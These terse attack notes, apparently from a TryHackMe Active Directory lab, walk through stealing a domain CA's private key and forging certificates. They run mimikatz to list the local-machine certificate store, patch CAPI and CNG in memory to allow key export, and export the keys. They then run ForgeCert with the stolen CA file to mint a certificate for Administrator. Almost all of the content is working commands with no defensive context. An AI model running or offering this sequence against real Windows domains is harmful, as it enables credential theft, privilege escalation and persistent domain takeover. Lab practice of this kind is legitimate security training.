Extracting Private Key
```
mkdir <folder>
cd <folder>
C:\Tools\mimikatz_trunk\x64\mimikatz.exe

mimikatz # crypto::certificates /systemstore:local_machine #If on DC already
```

Patch memory to export keys
```
crypto::capi
crypto::cng
```

Export keys
```
crypto::certificates /systemstore:local_machine /export
```

Generating our own certificates
```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```